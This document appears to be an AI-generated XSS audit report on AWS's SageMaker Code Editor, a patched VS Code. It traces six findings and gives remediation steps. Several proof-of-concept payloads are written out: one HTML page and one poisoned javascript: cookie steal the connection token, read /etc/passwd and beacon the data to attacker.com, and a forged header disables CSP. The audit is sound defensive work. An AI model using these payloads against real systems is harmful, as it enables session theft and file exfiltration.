# XSS Security Audit Report: aws/sagemaker-code-editor

**Scope:** Cross-Site Scripting (XSS) only — stored, reflected, DOM-based, cookie-based, postMessage-based
**Target:** https://github.com/aws/sagemaker-code-editor (patched VS Code v1.90.1 + SageMaker patches)
**Date:** 2026-03-10
**Methodology:** 40+ specialized agents with multi-agent-per-file verification, cross-file taint tracing, encoding bypass analysis, and postMessage deep-dive
**Standard:** Modern browsers only (Chrome, Firefox, Safari current). No IE, no content-sniffing, no obsolete behavior.

---

## Table of Contents

1. [Source and Sink Inventory](#a-source-and-sink-inventory)
2. [Confirmed XSS Findings](#b-confirmed-xss-findings)
3. [Confirmed XSS-Enabling Findings](#c-confirmed-xss-enabling-findings)
4. [Likely False Positives / Mitigated Issues](#d-likely-false-positives--mitigated-issues)
5. [Clean Areas (No XSS Found)](#e-clean-areas-no-xss-found)
6. [Agent Summary](#f-agent-summary)

---

## A) Source and Sink Inventory

### User-Controlled Inputs (Sources)

| Source | Location | Type |
|--------|----------|------|
| `X-Original-Host` / `X-Forwarded-Host` / `Host` headers | `webClientServer.ts:286-289` | HTTP header (proxy-controlled) |
| `redirectURL` cookie | `client.ts:25` (sagemaker-integration.diff) | Cookie value |
| `clusterId` URL parameter | `extensionsWorkbenchService.ts:955` (patch) | URL query param |
| `region` URL parameter | `extensionsWorkbenchService.ts:956` (patch) | URL query param |
| `openNotebook` URL parameter | `extensionsWorkbenchService.ts:954` (patch) | URL query param |
| `parentOrigin` URL parameter | `webview/pre/index.html:337` | URL query param |
| `path` query param on `/vscode-remote-resource` | `remoteExtensionHostAgentServer.ts:142` | URL query param |
| URL path on `/web-extension-resource/*` | `webClientServer.ts:191` | URL path segment |
| `vscode-tkn` cookie | `webClientServer.ts:258` | Cookie value |
| `error` query param on OAuth `/` | `authServer.ts` (both GitHub/Microsoft) | URL query param |
| `nonce` query param on OAuth `/signin` | `authServer.ts:99` | URL query param |
| WebSocket message data | `remoteExtensionHostAgentServer.ts:182+` | WebSocket frames |
| `postMessage` data (in webview context) | `webview/pre/index.html:312` | MessagePort messages |
| `postMessage` data (notebook webview, no origin check) | `webviewPreloads.ts:1629` | Window message (unvalidated) |
| `postMessage` data (issue reporter, no origin check) | `issueFormService.ts:41,190,215` | Window message (unvalidated) |
| Notebook cell outputs (`text/html`, `image/svg+xml`) | `notebook-renderers/src/index.ts:107` | File content |

### Rendering Sinks

| Sink | Location | Type |
|------|----------|------|
| CSP `script-src` header interpolation | `webClientServer.ts:392` | HTTP header injection |
| `data-settings` HTML attribute via `asJSON` | `workbench.html:20` | HTML attribute |
| `document.write()` in webview inner iframe | `webview/pre/index.html:1031-1032` | Full HTML write |
| `element.innerHTML = trustedHtml` (notebook renderer) | `notebook-renderers/src/index.ts:107` | innerHTML |
| `element.innerHTML = trustedHtml` (notebook webview) | `webviewPreloads.ts:1629` (passthrough TrustedTypes) | innerHTML |
| `domEval(element)` (notebook script execution) | `notebook-renderers/src/index.ts:124` | Script execution |
| `execCommand(data)` in webview | `webview/pre/index.html:1214` | DOM command |
| `mainWindow.location.href = href` | `openerService.ts:126` | Navigation/JS execution |
| `window.location.href = logoutUrl` | `client.ts:49` (sagemaker-integration.diff) | Navigation |
| Template literal in `%%bash` notebook cell | `sagemaker-open-notebook-extension/extension.ts:55` | Shell command |
| `new Worker(url)` from message data | `webWorkerExtensionHostIframe.html:91` | Script loading |
| HTTP response proxy (pass-through Content-Type) | `webClientServer.ts:237` | Same-origin HTML serving |

---

## B) Confirmed XSS Findings

### XSS-01: Webview Origin Bypass → postMessage → document.write() (CRITICAL)

- **Type:** postMessage XSS
- **Files:** `webview.diff` (patch), `webview/browser/pre/index.html:347-350`, `webview/browser/pre/index-no-csp.html`, `webWorkerExtensionHostIframe.html`
- **User-controlled input:** `parentOrigin` URL query parameter
- **Unsafe sink:** `document.write()` at `index.html:1031-1032` in inner webview iframe
- **Full taint path:**
  1. Attacker serves a page on the **same hostname** (co-tenant, path-routing, or port-based)
  2. Attacker embeds the webview iframe: `<iframe src="/static/.../index.html?id=x&parentOrigin=https://same-host">`
  3. The `webview.diff` patch adds a same-hostname bypass (line 347-350):
     ```js
     const parent = new URL(parentOrigin)
     if (parent.hostname === hostname) {
         return start(parentOrigin)  // Skips SHA-256 crypto validation
     }
     ```
  4. This bypasses the original cryptographic `parentOriginHash` validation entirely
  5. The webview calls `window.parent.postMessage({...}, parentOrigin, [this.channel.port2])` — transferring `port2` to the attacker (who IS the parent)
  6. Attacker intercepts `port2` via `window.addEventListener('message', e => { port = e.ports[0]; })`
  7. Attacker sends via stolen port: `port.postMessage({ channel: 'content', args: { contents: '<script>alert(document.domain)</script>', options: { allowScripts: true } } })`
  8. The `'content'` handler calls `document.write(newDocument)` into the inner sandboxed iframe with `allow-scripts allow-same-origin`
- **Why existing sanitization fails:**
  - The original SHA-256 hash validation was the primary defense — the patch replaces it with a hostname-only comparison
  - The hostname check is `parent.hostname === hostname` — no scheme or port validation
  - The `webview.diff` also moves webviews to the **same origin** as the main app (via relative `webviewEndpoint`), making the hostname check always pass
  - `index-no-csp.html` has **no CSP at all**, providing zero fallback protection
- **Exploitable in modern browsers:** Yes
  - Requires attacker to serve content on the same hostname (common in SageMaker multi-tenant environments with path-based routing)
  - Port-based bypass: attacker on `localhost:9999` passes the check against IDE on `localhost:8080`
- **Minimal PoC:**
  ```html
  <!-- Attacker page on same hostname -->
  <iframe id="wv" src="/static/.../index.html?id=evil&parentOrigin=https://same-host.example.com"></iframe>
  <script>
  window.addEventListener('message', e => {
    if (e.ports[0]) {
      const port = e.ports[0];
      port.postMessage({
        channel: 'content',
        args: {
          contents: '<html><body><script>fetch("/vscode-remote-resource?path=/etc/passwd&tkn="+document.cookie.match(/vscode-tkn=([^;]+)/)[1]).then(r=>r.text()).then(d=>navigator.sendBeacon("https://attacker.com/log",d))<\/script></body></html>',
          options: { allowScripts: true, allowForms: true },
          state: undefined, title: 'x'
        }
      });
    }
  });
  </script>
  ```
- **Impact:** Full XSS in the VS Code server origin. Access to cookies (connection token lacks `httpOnly`), localStorage, authenticated API calls. Can read arbitrary files via `/vscode-remote-resource`, execute terminal commands via WebSocket IPC, install malicious extensions.
- **Confidence:** HIGH
- **False-positive notes:** Requires same-hostname attacker presence. In single-tenant deployments with no co-tenants, exploitability is reduced. However, SageMaker Studio environments commonly use shared hostnames with path-based routing.

---

### XSS-02: CSP Header Injection via Host Header (HIGH)

- **Type:** Reflected XSS enabler (CSP destruction)
- **File:** `webClientServer.ts:392` (CSP construction), `webClientServer.ts:286-289` (source)
- **User-controlled input:** `X-Original-Host` or `X-Forwarded-Host` HTTP header
- **Unsafe sink:** Content-Security-Policy `script-src` directive
- **Full taint path:**
  1. `getFirstHeader('x-original-host')` reads header with zero validation (line 288)
  2. Stored in `remoteAuthority` (line 286)
  3. Interpolated raw into CSP: `` `http://${remoteAuthority}` `` (line 392)
  4. Browser receives a CSP with attacker-injected source expressions
- **Why existing sanitization fails:** There is literally none. The header value is interpolated verbatim into the CSP directive string. No regex validation, no character allowlist, nothing.
- **Exploitable in modern browsers:** Yes, with header control
  - Requires attacker to control proxy headers (misconfigured reverse proxy, MITM, or direct request)
  - Node.js does NOT reject spaces, quotes, or semicolons in HTTP header values
- **Minimal PoC:**
  ```
  GET / HTTP/1.1
  Host: normal-host.example.com
  X-Original-Host: x 'unsafe-inline' *;script-src-elem 'unsafe-inline' *
  ```
  Resulting CSP `script-src`:
  ```
  script-src 'self' 'unsafe-eval' sha256-... http://x 'unsafe-inline' *;script-src-elem 'unsafe-inline' *;
  ```
  This completely neutralizes CSP for inline scripts. The `;` injects a new `script-src-elem` directive that overrides `script-src` per CSP Level 3.
- **Impact:** Destroys CSP protection. Any secondary injection vector (DOM XSS, reflected XSS, or co-existing vulnerability) that was previously blocked by CSP now executes freely. Combined with other findings, enables full XSS.
- **Confidence:** HIGH
- **False-positive notes:** The `asJSON` function correctly prevents HTML attribute breakout (see section D), so CSP destruction alone does not achieve XSS without a secondary injection point. However, the same `remoteAuthority` flows into the HTML body, and in environments with any other XSS vector, this CSP bypass makes it exploitable.

---

### XSS-03: Cookie `redirectURL` → `javascript:` URI → Code Execution (HIGH)

- **Type:** Cookie-based XSS
- **Files:** `sagemaker-integration.diff` (`client.ts:25`), `sagemaker-extension/src/extension.ts:65,97`, `openerService.ts:126`
- **User-controlled input:** `redirectURL` cookie value
- **Unsafe sink:** `mainWindow.location.href = href` in `openerService.ts:126`
- **Full taint path:**
  1. `getCookieValue('redirectURL')` reads cookie with no validation (`client.ts:25`)
  2. Exposed via `sagemaker.parseCookies` command to any extension (`client.ts:34-42`)
  3. Extension calls `vscode.env.openExternal(vscode.Uri.parse(redirectURL))` (`extension.ts:65,97`)
  4. Flows through `extHostWindow` → `mainThreadWindow` → `openerService.open()` with `openExternal: true`
  5. In `openerService.ts`, the `DefaultExternalOpener` checks `matchesSomeScheme(href, http, https)` — `javascript:` is NOT http/https
  6. Falls to else branch: `mainWindow.location.href = href` (line 126) — **executes the JavaScript**
- **Why existing sanitization fails:**
  - `extHostWindow.ts:68-83` only blocks the `command:` scheme — `javascript:` passes
  - `trustedDomainsValidator.ts:45-46` auto-approves non-HTTP schemes: `return true`
  - No scheme allowlist exists anywhere in the chain
- **Exploitable in modern browsers:** Yes, but requires cookie poisoning
  - Cookie can be set via: subdomain cookie injection (common in shared-domain deployments), prior XSS on sibling domain, header injection, or MITM on non-HTTPS connections
  - `javascript:` URI in `location.href` executes in all modern browsers
- **Minimal PoC:**
  Set cookie: `redirectURL=javascript:fetch('/vscode-remote-resource?path=/etc/passwd%26tkn='+document.cookie.match(/vscode-tkn=([^;]+)/)[1]).then(r=>r.text()).then(d=>navigator.sendBeacon('https://attacker.com',d))`
  Then trigger session expiry/renewal flow in the SageMaker extension.
- **Impact:** Full XSS in the VS Code workbench window. Can invoke VS Code commands, read/write files, execute terminal commands.
- **Confidence:** MEDIUM-HIGH (cookie poisoning prerequisite reduces practical exploitability)
- **False-positive notes:** Requires the ability to set cookies on the target domain. In SageMaker Studio environments with shared parent domains, subdomain cookie injection is feasible.

---

### XSS-04: Web Extension Resource Proxy → Same-Origin HTML Serving (HIGH)

- **Type:** Reflected/Stored XSS via same-origin content proxy
- **File:** `webClientServer.ts:177-246` (`_handleWebExtensionResource`)
- **User-controlled input:** URL path segment (authority portion)
- **Unsafe sink:** Proxied HTTP response served from VS Code server origin with pass-through `Content-Type`
- **Full taint path:**
  1. Request to `/web-extension-resource/<authority>/<path>`
  2. Authority extracted from URL path (line 195): `authority: path.substring(0, path.indexOf('/'))`
  3. Authority validated by **suffix match only** (line 177-179): compares text after first `.` against template
  4. If suffix matches, server fetches `http://<authority>/<path>` (line 217-221)
  5. Response served to client with **original Content-Type** (line 237) — no filtering
  6. No CSP header on proxied response
- **Why existing sanitization fails:**
  - Authority check: `_getResourceURLTemplateAuthority` strips everything before first `.` and compares suffix only
  - If template authority is `*.gallerycdn.vsassets.io`, then `evil.gallerycdn.vsassets.io` passes
  - Content-Type is passed through verbatim — `text/html` is not blocked
  - No `X-Content-Type-Options`, no `Content-Disposition`, no CSP on proxied responses
- **Exploitable in modern browsers:** Yes, if attacker controls a matching subdomain
  - Requires: valid connection token AND control of a subdomain matching the gallery suffix
  - The gallery domain may have wildcard DNS, or attacker may register a matching subdomain
- **Impact:** Attacker-controlled HTML/JS executes in the VS Code server's origin. Full access to cookies, localStorage, authenticated endpoints.
- **Confidence:** MEDIUM (requires subdomain control + valid connection token)
- **False-positive notes:** Exploitability depends on the specific gallery domain configuration and whether wildcard subdomains exist.

---

### XSS-05: Extension Host Iframe Origin Bypass (HIGH)

- **Type:** postMessage XSS
- **File:** `webWorkerExtensionHostIframe.html` (modified by `webview.diff`)
- **User-controlled input:** `parentOrigin` URL query parameter (line 16)
- **Unsafe sink:** `new Worker(url)` from inner worker messages (line 91), plus full extension host API access
- **Full taint path:**
  1. `parentOrigin = searchParams.get('parentOrigin')` — attacker-controlled via URL
  2. Same hostname bypass added by `webview.diff` (lines 129-133) skips crypto validation
  3. `self.onmessage` handler (line 116-120) validates `event.origin !== parentOrigin` — attacker sets `parentOrigin` to their own origin
  4. Messages forwarded to inner Web Worker: `worker.postMessage(event.data, event.ports)`
  5. CSP includes `'unsafe-eval'` and `https:` — permissive for script execution
- **Why existing sanitization fails:** The `parentOrigin` is a URL query parameter used as a trust anchor — attacker controls it
- **Exploitable in modern browsers:** Yes, requires same-hostname attacker presence
- **Impact:** Compromise of the extension host sandbox. Access to VS Code extension APIs (filesystem, terminal, commands).
- **Confidence:** HIGH
- **False-positive notes:** Same prerequisites as XSS-01 (same-hostname attacker).

### XSS-06: Notebook Webview postMessage → innerHTML (No Origin Check) (MEDIUM)

- **Type:** postMessage DOM XSS
- **File:** `src/vs/workbench/contrib/notebook/browser/view/renderers/webviewPreloads.ts:1629`
- **User-controlled input:** `window.addEventListener('message', ...)` with **no `event.origin` or `event.source` check**
- **Unsafe sink:** `element.innerHTML = trustedHtml` where the TrustedTypes policy is a passthrough (`createHTML: value => value` — zero sanitization)
- **Full taint path:**
  1. `window.addEventListener('message', ...)` — no origin validation at line 1629
  2. Message type `'html'` dispatches to `viewModel.renderOutputCell(data)`
  3. `content.htmlContent` → `ttPolicy.createHTML(content.htmlContent)` — passthrough policy
  4. `element.innerHTML = trustedHtml` — arbitrary HTML injection
- **Why existing sanitization fails:** TrustedTypes policy is `createHTML: value => value` — it's a spec-compliance wrapper with no actual sanitization. No CSP or DOMPurify applied.
- **Mitigating factors:** Runs inside a sandboxed webview iframe (`sandbox="allow-scripts allow-same-origin"`) on a separate hash-based origin. Escape to the main VS Code window requires a same-origin bypass.
- **Exploitable in modern browsers:** Yes — within the notebook webview context. A malicious renderer extension or cross-cell content can inject arbitrary HTML/JS into other notebook output cells.
- **Impact:** Cross-cell XSS within the notebook webview. Script execution within the sandboxed iframe. Cannot directly escape to the main VS Code window due to iframe sandbox.
- **Confidence:** HIGH
- **False-positive notes:** The code comments acknowledge this: "renderer extensions are responsible for sanitizing their content themselves." This is by-design trust delegation, not accidental.

---

## C) Confirmed XSS-Enabling Findings

These are not directly exploitable XSS but significantly amplify the impact of other findings.

### XSS-EN-01: Connection Token Cookie Missing `httpOnly` (LOW)

- **File:** `webClientServer.ts:258-264`
- **Issue:** `vscode-tkn` cookie set without `httpOnly` or `secure` flags
- **Impact:** Any XSS (via XSS-01 through XSS-05) can read `document.cookie` and steal the connection token, which grants access to all authenticated endpoints including arbitrary file read (`/vscode-remote-resource`), WebSocket tunnel (SSRF), and extension install.

### XSS-EN-02: `sagemaker.parseCookies` Exposes Secrets to Any Extension (LOW)

- **File:** `sagemaker-integration.diff` (`client.ts:34-42`)
- **Issue:** `CommandsRegistry.registerCommand` with no access control exposes `authMode`, `expiryTime`, `redirectURL`, `studioUserProfileName` to any installed extension
- **Impact:** A malicious extension can read all SageMaker session cookies and the unvalidated `redirectURL`.

### XSS-EN-03: Missing `return` After Nonce Failure in OAuth `/signin` (MEDIUM)

- **Files:** Both `github-authentication/src/node/authServer.ts:100-106` and `microsoft-authentication/src/node/authServer.ts:100-106`
- **Issue:** No `return` after `res.end()` on nonce failure — execution falls through to the OAuth redirect, bypassing nonce validation
- **Impact:** Authentication bypass on the OAuth loopback server. Not directly XSS but weakens auth.

### XSS-EN-04: `asJSON` Incomplete Escaping — Defense-in-Depth Gap (LOW)

- **File:** `webClientServer.ts:295-297`
- **Issue:** `asJSON` only escapes `"` → `&quot;`. Does NOT escape `<`, `>`, `&`.
- **Current status:** NOT exploitable because the value is in a double-quoted HTML attribute on a `<meta>` tag, where `<>` are inert per HTML5 spec. `&quot;` correctly prevents attribute breakout.
- **Risk:** If the template is ever refactored to place this JSON inside a `<script>` tag, `</script>` injection would immediately work. CSP hashes are computed AFTER template substitution, so CSP would not protect.

### XSS-EN-05: Issue Reporter postMessage Listeners Without Origin Validation (LOW)

- **Files:** `issueFormService.ts:41,190,215` and `issueReporterModel.ts:62`
- **Issue:** Four `window.addEventListener('message', ...)` listeners with **no `event.origin` check**:
  - Listener at `:41` matches `sendChannel === 'vscode:triggerReporterMenu'` and calls `action.run()` for matching extension IDs — a cross-origin message could trigger extension menu actions
  - Listener at `:62` responds to `vscode:triggerIssueData` with `postMessage({...}, '*')` — leaks issue data (title, body) to **any origin**
- **Impact:** Cross-origin action triggering on the issue reporter page, and information leakage of issue data. Limited by the issue reporter running in a separate webview context.
- **Recommended fix:** Add `event.origin` validation to all four listeners. Replace `postMessage(..., '*')` with a specific target origin.

---

## D) Likely False Positives / Mitigated Issues

### FP-01: `remoteAuthority` in HTML `data-settings` Attribute (NOT EXPLOITABLE)

- **Claim:** Header-injected `remoteAuthority` containing `</meta><script>alert(1)</script>` achieves XSS
- **Why it's false:** In HTML5, `<` and `>` inside a **double-quoted attribute value** are treated as literal characters — they do NOT start or close tags. The `&quot;` replacement in `asJSON` correctly prevents attribute breakout. The `<meta>` tag is a void element; `</meta>` is ignored by the parser. Full analysis confirms no attribute breakout is possible.
- **Additionally:** The `base-path.diff` adds a client-side override `remoteAuthority: location.host` that replaces the server-injected value before application code uses it.

### FP-02: `error` Query Parameter in OAuth `index.html` (NOT EXPLOITABLE)

- **Claim:** Reflected XSS via error param in OAuth pages
- **Why it's false:** Both GitHub and Microsoft `index.html` files use `.textContent` (not `.innerHTML`) to display the error. `textContent` never parses HTML.

### FP-03: WebSocket Data → DOM in Terminal PoC (NOT EXPLOITABLE)

- **Claim:** WebSocket data could inject HTML via terminal output
- **Why it's false:** The PoC file (`code-editor-terminal-poc.html`) uses `.textContent` exclusively for all DOM output. No `innerHTML` anywhere.

### FP-04: `WORKBENCH_WEB_BASE_URL` Template Injection (NOT EXPLOITABLE by remote attacker)

- **Claim:** Single-quote breakout in `'{{WORKBENCH_WEB_BASE_URL}}'` JS context
- **Why it's false:** This value derives from the `--base-path` CLI argument (server operator controlled), not from per-request user input. An external attacker cannot influence it.

### FP-05: Encoding Bypass Attempts Against `asJSON` (ALL BLOCKED)

Tested scenarios: double-encoding (`%3C`), Unicode escapes (`\u003c`), HTML entities (`&lt;`), null bytes (`\x00`), UTF-7 (`+ADw-`), overlong UTF-8 — **all blocked** by the combination of JSON.stringify + `&quot;` replacement + HTML5 attribute parsing rules.

---

## E) Clean Areas (No XSS Found)

| Component | Files Reviewed | Result |
|-----------|---------------|--------|
| `sagemaker-idle-extension` | `extension.ts` | No XSS. Pure filesystem operations, no HTML rendering |
| `sagemaker-extensions-sync` | `extension.ts`, `utils.ts`, `constants.ts` | No XSS. Filesystem-only, no webviews |
| `sagemaker-terminal-crash-mitigation` | `extension.ts` | No XSS. No DOM interaction |
| `tunnel-forwarding` extension | `extension.ts` | No XSS. No webviews or HTML rendering |
| CORS origin regex | `remoteExtensionHostAgentServer.ts:868-908` | Properly anchored `^...$`, `escapeRegExpCharacters` applied. No bypass found |
| `callback.html` | `src/vs/code/browser/workbench/callback.html` | Safe. Uses `JSON.stringify` + `localStorage.setItem`. No DOM rendering |
| OAuth `index.html` (both) | `github-authentication/media/index.html`, `microsoft-authentication/media/index.html` | Safe. Uses `.textContent` for error display |
| Media preview scripts | `imagePreview.js`, `videoPreview.js`, `audioPreview.js` | Safe. `imagePreview.js` has proper origin check (`e.origin !== window.origin`). No innerHTML |
| Git IPC / askpass | `askpass.ts`, `ipcServer.ts` | No XSS. Unix socket only, JSON responses, no browser access |
| CLI IPC server | `extHostCLIServer.ts` | No XSS. All responses `application/json` |
| `serveError` responses | All error handlers | Safe. All use `Content-Type: text/plain` |
| `_handleStatic` | `webClientServer.ts:162-175` | Safe. `isEqualOrParent` containment check after `path.join` |
| `_handleCallback` | `webClientServer.ts:446-463` | Safe. Serves static file, no template substitution |
| Remaining patches | `disable-online-services.diff`, `disable-telemetry.diff`, `display-language.diff`, `license.diff`, `local-storage.diff` | No XSS. Configuration changes only |
| Region validation | `sagemaker-open-notebook-extension/extension.ts:20-24` | Regex `/^[a-zA-Z0-9-]+$/` blocks shell metacharacters |
| `serverConnectionToken.ts` | Token validation | Not timing-safe (`===` vs `timingSafeEqual`) but not XSS |

---

## F) Agent Summary

| Agent # | Target | Key Finding |
|---------|--------|-------------|
| 1 | `webClientServer.ts` — sinks | CSP injection (XSS-02), `asJSON` analysis (XSS-EN-04) |
| 2 | `remoteExtensionHostAgentServer.ts` — sinks | CSP injection confirmed, CORS regex safe |
| 3 | GitHub `authServer.ts` + `index.html` | Missing `return` (XSS-EN-03), error display safe (textContent) |
| 4 | Microsoft `authServer.ts` + `index.html` | Same missing `return`, same safe error display |
| 5 | `workbench.html` + `callback.html` | Template analysis, callback.html safe |
| 6 | `serverConnectionToken.ts` + `server.cli.ts` | No XSS. `openExternal` scheme filter on CLI side |
| 7 | Webview `index.html` + `index-no-csp.html` + `fake.html` | MessageChannel architecture, `document.write` sink, SHA-256 validation |
| 8 | `extHostCLIServer.ts` flow | `javascript:` URI → `location.href` (confirms XSS-03 chain) |
| 9 | CORS origin regex | Properly anchored, no bypass |
| 10 | All patch files — XSS diff review | `webview.diff` (XSS-01), `base-path.diff` mitigations, `sagemaker-integration.diff` cookie exposure |
| 11 | `sagemaker-extension` — full audit | `redirectURL` → `openExternal` flow (XSS-03) |
| 12 | `sagemaker-open-notebook-extension` | `clusterId` command injection (not XSS, but critical) |
| 13 | `sagemaker-idle-extension` | Clean — no XSS surface |
| 14 | `sagemaker-terminal-crash-mitigation` | Clean — no HTML rendering |
| 15 | `sagemaker-extensions-sync` | Clean — filesystem only |
| 16 | `sagemaker-integration.diff` deep dive | Cookie exposure, `redirectURL` no validation, logout redirect |
| 17 | `webview.diff` deep dive | Origin bypass (XSS-01), same-origin serving, CSP changes |
| 18 | `base-path.diff` deep dive | Client-side `remoteAuthority` override mitigates header injection |
| 19 | `trustedDomainsValidator.ts` | Non-HTTP schemes auto-approved (confirms XSS-03) |
| 20 | `openerService.ts` — `javascript:` flow | `location.href = href` for non-http schemes (confirms XSS-03) |
| 21 | `callback.html` | Safe — JSON.stringify to localStorage only |
| 22 | Media preview scripts | Safe — proper origin check, no innerHTML |
| 23 | ipynb cell attachment renderer | No direct DOM sinks; `data:` URI in `<img>` is browser-sandboxed |
| 24 | `webWorkerExtensionHostIframe.html` | Origin bypass (XSS-05), `parentOrigin` from query param |
| 25 | `asJSON` escaping completeness | Sufficient for current attribute context; fragile for refactoring |
| 26 | CSP header injection deep dive | Confirmed `;` injection, `script-src-elem` override |
| 27 | Git askpass / IPC | Clean — Unix socket, JSON responses |
| 28 | `issueReporter.html` | Clean — static shell, no inline scripts |
| 29 | `tunnel-forwarding` extension | Clean — no HTML rendering |
| 30 | Cookie → `openExternal` cross-file chain | Full chain validated (XSS-03) |
| 31 | Header → CSP + HTML injection chain | CSP destruction confirmed; HTML attribute breakout blocked |
| 32 | Webview same-origin postMessage bypass | Full attack chain validated (XSS-01) |
| 33 | Encoding bypass scenarios (8 tests) | All blocked by JSON.stringify + `&quot;` + HTML5 parsing |
| 34 | localStorage/sessionStorage flows | Safe — JSON.stringify before storage, no rendering |
| 35 | innerHTML grep across codebase | Notebook renderers use innerHTML (by design, sandboxed webview) |
| 36 | postMessage listeners grep (31 listeners, 24 files) | 26/31 safe (MessageChannel/Worker/origin-checked); 1 exploitable (notebook webviewPreloads.ts innerHTML); 4 risky (issueFormService/issueReporterModel no origin check) |
| 37 | URL fragment/hash flows | No hash-based XSS flows found |
| 38 | Web extension resource proxy | Suffix-match bypass (XSS-04), same-origin HTML serving |
| 39 | Notebook `text/html` rendering | Raw innerHTML + `domEval` in sandboxed webview; gated by Workspace Trust |
| 40 | Remaining patches | All clean — configuration changes only |

---

## Summary of Confirmed Findings

| ID | Type | Severity | Confidence | Prerequisite |
|----|------|----------|------------|-------------|
| **XSS-01** | postMessage XSS (webview origin bypass) | **CRITICAL** | HIGH | Same-hostname attacker presence |
| **XSS-02** | CSP header injection | **HIGH** | HIGH | Header control (proxy/MITM) |
| **XSS-03** | Cookie → `javascript:` → `location.href` | **HIGH** | MEDIUM-HIGH | Cookie poisoning |
| **XSS-04** | Same-origin HTML proxy | **HIGH** | MEDIUM | Subdomain control + connection token |
| **XSS-05** | Extension host iframe origin bypass | **HIGH** | HIGH | Same-hostname attacker presence |
| **XSS-06** | Notebook webview postMessage → innerHTML | **MEDIUM** | HIGH | Malicious renderer extension or cross-cell content |

### Recommended Priority Fixes

1. **XSS-01 + XSS-05:** Restore cryptographic `parentOriginHash` validation. Remove the same-hostname bypass. Serve webviews from a separate origin (dedicated subdomain or `vscode-webview.net`).
2. **XSS-02:** Validate `remoteAuthority` with strict regex `/^[\w.:-]+$/` before CSP interpolation. Never interpolate untrusted input into security headers.
3. **XSS-03:** Add scheme allowlist (`https:` only) on `redirectURL` before passing to `openExternal`. Block `javascript:`, `data:`, `vbscript:` schemes in `openerService`.
4. **XSS-04:** Validate full authority (not just suffix) against an allowlist. Add `Content-Type` restriction (only allow known-safe MIME types). Set `X-Content-Type-Options: nosniff` and restrictive CSP on proxied responses.
5. **XSS-06:** Add `event.origin` validation to the notebook webview `window.addEventListener('message')` listener. Replace passthrough TrustedTypes policy with actual HTML sanitization (e.g., DOMPurify).
6. **XSS-EN-01:** Add `httpOnly` and `secure` flags to the connection token cookie.
7. **XSS-EN-04:** Enhance `asJSON` to escape `<` → `\u003C` and `>` → `\u003E` for defense-in-depth.
8. **XSS-EN-05:** Add `event.origin` validation to all issue reporter postMessage listeners. Replace `postMessage(..., '*')` with specific target origin.
